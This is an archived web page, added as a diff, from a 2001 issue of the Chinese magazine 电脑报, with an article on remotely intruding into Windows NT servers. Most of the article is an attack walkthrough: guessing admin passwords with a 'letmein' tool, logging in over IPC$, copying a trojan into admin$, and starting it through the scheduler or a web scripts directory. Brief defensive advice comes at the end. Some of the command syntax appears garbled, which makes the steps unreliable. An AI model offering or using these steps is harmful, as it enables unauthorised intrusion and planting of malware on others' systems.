@@ -1,0 +1,145 @@
+ 
+<html>
+<!-- #BeginTemplate "/Templates/internet.dwt" --> 
+<head>
+<!-- #BeginEditable "doctitle" --> 
+<title>远程入侵Windows </title>
+<!-- #EndEditable --> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<link rel="stylesheet" href="library/DNB/2001/0123/cpcw.css">
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="2" marginwidth="0" marginheight="0">
+<table width="770" border="1" cellspacing="0" cellpadding="1" align="center" bordercolorlight="#CCCCCC" bordercolordark="#FFFFFF">
+  <tr> 
+    <td width="148" align="center"> <iframe src="http://www.lpzx.edu.cn/library/www.yesky.com/adj/html/cpcw-left.htm" width="140" height="60" frameborder="0" scrolling="no"></iframe> 
+    </td>
+    <td width="473" align="center" height="61"> 
+      <script language="JavaScript" src="http://www.lpzx.edu.cn/library/www.yesky.com/adj/js/cpcw.js"></script>
+    </td>
+    <td align="center" width="149"><iframe src="http://www.lpzx.edu.cn/library/www.yesky.com/adj/html/cpcw-right.htm" width="140" height="60" frameborder="0" scrolling="no"></iframe></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="22" bgcolor="#3366CC">
+  <tr> 
+    <td width="40" align="center" height="20"><img src="images/b1.gif" width="14" height="14"></td>
+    <td width="583" height="20"> <span class="wj">| <a href="wrapup.html" class="wj"><font color="#FFFFFF">综合报道</font></a> 
+      | <a href="software.html"><font color="#FFFFFF">软件世界</font></a> 
+      | <a href="hardware.html"><font color="#FFFFFF">硬件周刊</font></a> 
+      | <a href="internet.html"><font color="#FFFFFF">互联网时代</font></a> 
+      | <a href="oa.html"><font color="#FFFFFF">OA专刊</font> 
+      </a>| <a href="game.html"><font color="#FFFFFF">游戏广场</font></a> 
+      | <a href="library/DNB/2001/0123/maket.html"><font color="#FFFFFF">评测与市场</font></a> 
+      | <a href="zt.html"><font color="#FFFFFF">专题版</font> 
+      </a>| <a href="library/DNB/default.htm"><font color="#FFFFFF">首页</font></a></span></td>
+    <td align="right" width="147" rowspan="2">&nbsp;</td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="48">
+  <tr> 
+    <td width="174" valign="bottom"><a href="library/DNB/default.htm"><img src="tit.gif" width="169" height="68" border="0"></a></td>
+    <td width="448" class="nava"><span class="nava">严正声明<br>
+      　　未经许可，任何商业网站或个人网站都不得提供《电脑报》电子版的浏览或下载！违者我们将追究其法律责任！</span></td>
+    <td align="right" width="148" valign="top"><a href="library/www.yesky.com/default.htm"><img src="http://www.lpzx.edu.cn/library/www.yesky.com/newimages/news/logo.gif" width="140" height="60" border="0"></a></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="11">
+  <tr> 
+    <td width="169" rowspan="2" valign="top">&nbsp;</td>
+    <td width="141" rowspan="2" valign="top">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td width="460" height="9"></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td colspan="3" valign="top"> 
+      <table width="600" border="0" cellspacing="0" cellpadding="0" align="center">
+        <tr> 
+          <td class="nava"><font color="#FF9900">你所在的位置：&gt;&gt;<a href="library/DNB/default.htm">《电脑报》电子版</a> 
+            &gt;&gt;<a href="index.html">2001年<!-- #BeginEditable "%B5%DA%BC%B8%C6%DA" -->第23期 <!-- #EndEditable --> 
+            </a>&gt;&gt;<a href="internet.html">互联网时代</a></font></td>
+        </tr>
+      </table>
+      <table width="430" border="0" cellspacing="0" cellpadding="0" align="center">
+        <tr> 
+          <td> 
+            <div align="center"><!-- #BeginEditable "%CE%C4%D5%C2%B1%EA%CC%E2" -->远程入侵Windows 
+              NT<!-- #EndEditable --></div>
+          </td>
+        </tr>
+      </table>
+      <table width="600" border="1" cellspacing="0" cellpadding="5" align="center" bordercolor="#FFCC99">
+        <tr> 
+          <td> 
+            <p><!-- #BeginEditable "%CE%C4%D5%C2%C4%DA%C8%DD" -->微软推出的Windows 
+              NT系统平台，曾经在网络组建上风靡一时，至今还有许多的网络系统使用它，但它的网络漏洞在微软的不断补丁下依然存在，每当我们为它打上微软的补丁后，新的漏洞又出现了。而利用这些漏洞进行网络远端入侵也是相当简单的事了。<br>
+              现在我们来看看如何远端入侵Windows NT主机！<br>
+              攻击步骤：<br>
+              首先，我们要攻击远端目标当然得知道对方得IP地址了，你可以使用各种扫描工具查找目标机器的IP地址，这里因为重点不是它所以就不多说了。<br>
+              在确定攻击目标后，使用Windows NT自带的命令取得远端目标的用户列表资源，分析取得的列表资源，尝试取得管理员权限。letmein命令用于通过指定的密码远程登录服务器，并读取服务器上的用户信息，配以不同的参数，可以获取相应的控制权。例如：<br>
+              letmein file//x．x．x．x/ -all -g mypwd 将查看＼＼x．x．x．x上的所有用户账户列表，并试图通过参数后面跟随的密码取得管理员的控制权<br>
+              letmein file//x．x．x．x/ -admin -g mypwd<br>
+              可以查看＼＼x．x．x．x上管理员的账户列表，并试图通过参数后面跟随的密码取得管理员的控制权。<br>
+              letmein file//x．x．x．x/ -all -d mypwd<br>
+              试图通过参数后面跟随的密码取得用户控制权，并显示＼＼x．x．x．x上所有用户名列表，<br>
+              当使用letmein命令获取相关管理员权限后，使用Windows提供的标准命令连接远程资源并将木马拷入远程目标，你可以使用的木马是很多的，这里不作介绍了，具体的命令是：<br>
+              net use ＼＼x．x．x．x＼ipc$ &quot;pass&quot;/user&quot;user&quot; 
+              (利用刚刚猜解到的用户名和密码登录＼＼x．x．x．x主机)<br>
+              copy x＼netserver．exe ＼＼x．x．x．x＼admin$＼system32 (拷贝本地木马程序netserver．exe到远端＼＼x．x．x．x的管理员目录下)<br>
+              再使用合法Windows NT命令远程启动刚才考入的木马程序：<br>
+              netsvc ＼＼x．x．x．x schedule /start at ＼＼x．x．x．x hhmm netserver．exe 
+              /portyourport /nomsg<br>
+              在上面的命令中利用了Windows NT的任务计划管理，在指定的时间和指定的端口运行木马程序。<br>
+              另一种方法：<br>
+              将需要运行的木马或其他可执行程序Copy到远端服务器的www可执行目录下( 如cgi-bin或scripts等)，然后在浏览器键入远端连接url来运行木马程序，如： 
+              http//x．x．x．x/scripts/ntsrver．exe/portyourport 或 http//x．x．x．x/cgi-gin/ntsrver．exe/portyourport 
+              等。<br>
+              到此，该次入侵可以算成功了，远程资源已在自己的控制下。<br>
+              攻击原理：<br>
+              简单分析一下这次攻击的过程，不难看出，关键步骤是利用letmein取得admin权限，但是很不幸，就目前部分的采用Windows 
+              NT系统平台服务器而言，所采用的网络管理密码，利用破解工具仅仅多花几分钟就能破解掉。同时，通过对某些大的公共平台服务器进行测试扫描的结果，使用Windows 
+              NT系统平台的服务器，其管理密码被letmein猜中率有75%以上。而且在这些被进入的机器上，SMB(文件和打印共享)又都是运行在TCP/IP协议上，而且只有部分服务器有配备火墙，一般没有封闭对外的137∽139端口，从而给网络入侵留下了后门。<br>
+              防范措施：<br>
+              1．管理人员应该及时检查日记和监控服务的运行，定时对文件系统的权限受托关系进行检查。<br>
+              2．对密码的选择有一个好的习惯。一个好的密码必须包括下面的内容：好记忆、不易被猜到、易输入，至于怎么才能作到，很多文章都有介绍的，这里就不多讲。<br>
+              3．适当配置NT网络服务，特别是TCP/IP协议，尽量不要在对外的服务上绑定共享服务。<br>
+              4．防火墙的配置要合理，屏蔽一切不需要的服务端口，像在TCP/IP上的137∽139端口，开这些端口只会使你的系统处于危险的处境，如果必须要在远程使用这些端口的服务，建议使用其他软件来代替，而不是单纯使用系统内定的服务。<!-- #EndEditable --></p>
+          </td>
+        </tr>
+      </table>
+      <br>
+      <br>
+      <br>
+    </td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="4" bgcolor="#FF9900">
+  <tr> 
+    <td width="161" bgcolor="#99CCFF"> </td>
+    <td width="610" bgcolor="#FF9900"></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td> 
+      <div align="center"><a href="library/DNB/bill/index.html" target="_blank"></a><a href="library/DNB/hdong/gao.htm" target="_blank"> 
+        欢迎投稿 </a> | <a href="library/DNB/bill/index.html" target="_blank">广告联系</a>| <a href="library/DNB/serve/dnbjs.htm" target="_blank">关于我们</a>| 
+        <a href="library/DNB/maillist/index.html" target="_blank">电子杂志</a>| <a href="library/DNB/hdong/zaopin.html" target="_blank">加入我们</a>| 
+        <a href="library/DNB/hdong/xinsi.html" target="_blank">隐私条款</a></div>
+    </td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td> 
+      <div align="center"><span class="nava"><font color="#000000" face="Arial, Helvetica, sans-serif"> 
+        Copyright (C) 2000 Yesky.com, All Rights Reserved </font><font color="#000000"><br>
+        版权所有　 <font face="Arial, Helvetica, sans-serif"> Yesky </font><br>
+        <a href="mailto:webmaster@yesky.com"> 如有意见请与我们联系 </a></font></span></div>
+    </td>
+  </tr>
+</table>
+</body>
+<!-- #EndTemplate -->
+</html>
